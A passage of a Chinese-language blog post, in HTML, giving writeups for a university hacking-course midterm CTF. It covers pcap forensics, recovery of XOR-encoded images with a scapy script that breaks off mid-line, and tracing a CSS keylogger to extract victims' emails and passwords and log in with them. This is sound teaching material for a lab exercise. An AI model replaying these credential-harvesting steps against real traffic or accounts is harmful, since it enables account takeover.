@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[NSYSU 駭客攻防] Midterm Writeups - Cyris&#39;s Blog</title><meta name="Description" content="This is Cyris&#39;s blog, recording life and sharing security learning."><meta property="og:url" content="https://blog.cyris.tw/posts/2020/nsysu-htcf-midterm-writeups/">
+  <meta property="og:site_name" content="Cyris&#39;s Blog">
+  <meta property="og:title" content="[NSYSU 駭客攻防] Midterm Writeups">
+  <meta property="og:description" content="
+Writeups 搬自 MacacaHub HTCF Midterm writeups
+Author: @stavhaygn
+Writeup By: @yctseng1227">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-11-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-11-09T00:00:00+00:00">
+    <meta property="article:tag" content="NSYSU 駭客攻防">
+    <meta property="article:tag" content="CTF-Writeup">
+    <meta property="og:image" content="https://blog.cyris.tw/img/cyris.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://blog.cyris.tw/img/cyris.png">
+  <meta name="twitter:title" content="[NSYSU 駭客攻防] Midterm Writeups">
+  <meta name="twitter:description" content="
+Writeups 搬自 MacacaHub HTCF Midterm writeups
+Author: @stavhaygn
+Writeup By: @yctseng1227">
+      <meta name="twitter:site" content="@yctseng1227">
+<meta name="application-name" content="Cyris&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Cyris&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/img/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.cyris.tw/posts/2020/nsysu-htcf-midterm-writeups/" /><link rel="prev" href="https://blog.cyris.tw/posts/2020/nsysu-htcf-hw1/" /><link rel="next" href="https://blog.cyris.tw/posts/2020/nsysu-htcf-hw2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[NSYSU 駭客攻防] Midterm Writeups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysu-htcf-midterm-writeups\/"
+        },"image": ["https:\/\/blog.cyris.tw\/img\/cyris.png"],"genre": "posts","keywords": "NSYSU 駭客攻防, CTF-Writeup","wordcount":  697 ,
+        "url": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysu-htcf-midterm-writeups\/","datePublished": "2020-11-09T00:00:00+00:00","dateModified": "2020-11-09T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Cyris","logo": "https:\/\/blog.cyris.tw\/img\/cyris.png"},"author": {
+                "@type": "Person",
+                "name": "Cyris"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="#" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="#" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[NSYSU 駭客攻防] Midterm Writeups</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://blog.cyris.tw" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Cyris</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-cyber-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>資訊安全 Cyber Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-11-09">2020-11-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;697 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scoreboard">Scoreboard</a></li>
+    <li><a href="#forensics">Forensics</a>
+      <ul>
+        <li><a href="#images-0x1-100-points-23-solves">images 0x1 (100 points, 23 solves)</a>
+          <ul>
+            <li><a href="#description">Description</a></li>
+            <li><a href="#solution">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#css-keylogger-150-points-8-solves">CSS-Keylogger (150 points, 8 solves)</a>
+          <ul>
+            <li><a href="#description-1">Description</a></li>
+            <li><a href="#solution-1">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#images-0x2-250-points-1-solve">images 0x2 (250 points, 1 solve)</a>
+          <ul>
+            <li><a href="#description-2">Description</a></li>
+            <li><a href="#solution-2">Solution</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#hashmeow-120-points-2-solves">hashmeow (120 points, 2 solves)</a>
+          <ul>
+            <li><a href="#description-3">Description</a></li>
+            <li><a href="#solution-3">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#hashmeow-root-50-points-1-solve">hashmeow root (50 points, 1 solve)</a>
+          <ul>
+            <li><a href="#description-4">Description</a></li>
+            <li><a href="#solution-4">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#proftpd-120-points-0-solve">ProFTPD (120 points, 0 solve)</a>
+          <ul>
+            <li><a href="#description-5">Description</a></li>
+            <li><a href="#solution-5">Solution</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/monkey_flag.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/monkey_flag.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/monkey_flag.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/monkey_flag.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/monkey_flag.png"
+        title=" " /></p>
+<p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF-CTF-2020/midterm/readme.md" target="_blank" rel="noopener noreffer ">MacacaHub HTCF Midterm writeups</a></p>
+<p>Author: <strong>@stavhaygn</strong><br>
+Writeup By: <strong>@yctseng1227</strong></p>
+<br>
+<p>這次駭客攻防分成 筆試(1hr) &amp; 上機考(2hr)，根本就是金盾獎2.0，時間分配上要破台不太容易，何況為避免作弊情形還要邊寫題目邊截圖做個簡單報吿（嗚嗚好麻煩），題目難度我個人覺得中間偏易，畢竟助教也是根據老師上課所教的方向出題（甚至還有延伸學習），只是似乎對大部分同學來說比較沒有 CTF 經驗稍嫌困難一點，最後被老師建議下次多出一點基礎題 XDDDDDD</p>
+<p>老樣子先放上人權圖，被 MacacaHub 學弟搶走第一名好難過嗚嗚嗚<br>
+（唯一錯的那一次是 Flag 圖片打錯字，嗚嗚人生污點）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1618835101/blog-posts/misc/htcf2020-myscore.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1618835101/blog-posts/misc/htcf2020-myscore.webp, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1618835101/blog-posts/misc/htcf2020-myscore.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1618835101/blog-posts/misc/htcf2020-myscore.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1618835101/blog-posts/misc/htcf2020-myscore.webp"
+        title=" " /></p>
+<h2 id="scoreboard">Scoreboard</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/scoreboard.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/scoreboard.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/scoreboard.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/scoreboard.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/scoreboard.png"
+        title=" " /></p>
+<h2 id="forensics">Forensics</h2>
+<h3 id="images-0x1-100-points-23-solves">images 0x1 (100 points, 23 solves)</h3>
+<h4 id="description">Description</h4>
+<p>images~ images~ images~<br>
+<strong>hint</strong>: flag 在圖片裡</p>
+<p><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/images_0x1.pcap" target="_blank" rel="noopener noreffer ">Released file (pcap)</a></p>
+<h4 id="solution">Solution</h4>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">聽說不少人用 NetworkMiner 這軟體解得乾淨俐落（？）<br>
+不過考試當下封包數量不多就沒想這麼多，因此個人作法比叫偏手工</div>
+        </div>
+    </div>
+<p>用 wireshark 開啟 .pcap 後，用 <code>Follow &gt; TCP Stream</code>看大概只有 10 包 stream，其中不乏出現 .png 的 header 如圖。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/01.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/01.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/01.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/01.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/01.png"
+        title=" " /></p>
+<p>這部分可以用 <code>File &gt; Export Objects &gt; HTTP...</code> 把指定的檔案 dump 出來（重點是 multipart/form-data）。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/02.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/02.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/02.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/02.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/02.png"
+        title=" " /></p>
+<p>可以直接用 save all 把檔案存起來，然後用 hex editor 根據 <a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics" target="_blank" rel="noopener noreffer ">PNG</a> 的 header 把圖片的修好。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/03.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/03.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/03.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/03.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/03.png"
+        title=" " /></p>
+<p>圖片修完就看得到 Flag 了，全部大概五張我當時隨便戳就剛好是 Flag 了 ㄏㄏ</p>
+<h3 id="css-keylogger-150-points-8-solves">CSS-Keylogger (150 points, 8 solves)</h3>
+<h4 id="description-1">Description</h4>
+<p>有趣的CSS Keylogger文章：<br>
+<a href="https://blog.techbridge.cc/2018/03/02/css-key-logger/" target="_blank" rel="noopener noreffer ">CSS keylogger：攻擊與防禦</a><br>
+<a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense" target="_blank" rel="noopener noreffer ">Stealing Data With CSS: Attack and Defense</a></p>
+<p>嘗試在封包中分析此次的CSS Keylogger攻擊與受害者c7f網站上的信箱與密碼，並且嘗試登入</p>
+<p><strong>hint</strong>: 運氣好或靠實力拿到小遊戲中的flag吧</p>
+<p>網站連結 <code>http://c7f.macacahub.tw/login</code>
+<a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/CSS_Keylogger.pcap" target="_blank" rel="noopener noreffer ">Released file (pcap)</a></p>
+<h4 id="solution-1">Solution</h4>
+<p>題目給了兩篇關於 CSS Keylogger 的文章，算是課外補充。<br>
+如果認真對網站進行研究會發現該網站被駭入後，CSS Keylogger 寫在 <code>bootstrap.min.css</code> 內（不知道這個也解的出來啦 XD）。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/01.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/01.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/01.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/01.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/01.png"
+        title=" " /></p>
+<p>從網站 source code 可以看得出來登入會驗證信箱格式、以及密碼會加鹽再 Hash，因此不用期待能把封包內撈到的 Hash 拿去爆破密碼 =w=</p>
+<p>從.pcap封包檔的 <code>Follow &gt; TCP Stream</code> 可以觀察到如文章所提的 CSS Keylogger 帶出的參數。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/02.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/02.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/02.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/02.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/02.png"
+        title=" " /></p>
+<p>其中前面的 <code>/e/</code> 表示 email、<code>/p/</code> 表示password，也算一種小提示吧。
+總之整理前面所觀察到的封包特徵，可以用 filter 簡單過濾出來（當然用 TCP Stream 慢慢點也是可以啦 XD）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http &amp;&amp; ip.dst == 45.79.159.73
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/03.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/03.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/03.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/03.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/03.png"
+        title=" " /></p>
+<p>這樣就能拿到三組帳號，再來就是有點運氣的嘗試登入&hellip; 沒錯，會這麼說是因為我拿到帳密戳了半小時都沒成功，最後要放棄時就莫名其妙登入了XDDDDDD<br>
+事後和助教討論也沒得到個明確結果，如果有想法歡迎找我們討論QQ</p>
+<p>登入後&hellip; 抓猴子囉!!<br>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/04.gif"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/04.gif, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/04.gif 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/04.gif 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/04.gif"
+        title=" " /></p>
+<p>基本上五隻猴子只有一隻點得到Flag，如果不想慢慢用滑鼠點的話可以縮小視窗把他們關起來，或是直接開 source code 找連結拿 Flag !!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/05.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/05.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/05.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/05.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/05.png"
+        title="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/05.png" /></p>
+<h3 id="images-0x2-250-points-1-solve">images 0x2 (250 points, 1 solve)</h3>
+<h4 id="description-2">Description</h4>
+<p>小朋友才只用工具解題目，大朋友都寫code</p>
+<p><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/images_0x2.pcap" target="_blank" rel="noopener noreffer ">Released file (pcap)</a></p>
+<h4 id="solution-2">Solution</h4>
+<p>這題看起來沒有什麼特殊情境，就是很刻意的希望同學用 coding 解決問題XD<br>
+基本作法和 <a href="../nsysu-htcf-hw1/" rel="">駭客攻防 hw_0x01 Writeup</a> 差不多，只是要還原的東西不太一樣。</p>
+<p>封包題起手式一樣 <code>Follow &gt; TCP Stream</code>，看到封包內容有 <code>xor_key</code>、<code>image</code> 那就是要把圖片 XOR 還原出來了，方向應該是不難猜，只是在往後看可以發現有多達100個圖片，所以還是乖乖寫扣吧。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/01.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/01.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/01.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/01.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/01.png"
+        title=" " /></p>
+<p>順帶一提、<code>xor_key</code> 是用 base64 混淆過，就算 Decode 還原出來也是難以辨識的字串，助教存心不給人手動驗證（雖然圖片好像也很難手工還原就是&hellip;）。</p>
+<p>scapy 的教學參考上面連結就不再贅述，不過要注意的是撈 Raw 欄位的資料會有兩種情況（如圖），推測是封包太長被截成兩段QQ ，條件判斷上可以根據封包長度或是判斷資料內容是否有關鍵字。最後，我們關心的重點在 <code>xor_key</code>、<code>image</code> 還有 &hellip; 檔名!! 寫完就知道了XD</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/02.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/02.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/02.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/02.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/02.png"
+        title=" " /></p>
+<p>由於資料全部都串在一起，處理上有些麻煩&hellip; <code>xor_key</code> 和 <code>image</code> 可以用 <code>\r\n</code> 切出來，但 filename 就只能用 <a href="https://regex101.com/" target="_blank" rel="noopener noreffer ">Regular Expression</a> 篩出來，不然就是用指定位址的方式（因為圖片長度其實都相同 XD），剩下看扣應該不難懂：）</p>
+<div class="highlight" filename="solve.py"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pkts</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s1">&#39;images_0x2.pcap&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">pkts</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">IP</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">and</span> <span class="n">p</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="s1">&#39;140.117.169.219&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">Raw</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">and</span> <span class="sa">b</span><span class="s1">&#39;filename&#39;</span> <span class="ow">in</span> <span class="n">p</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">raw</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">filename</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;filename=&#34;(\w*.\w*)&#34;&#39;</span><span class="p">,</span> <span class="n">raw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">raw</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">])</span>
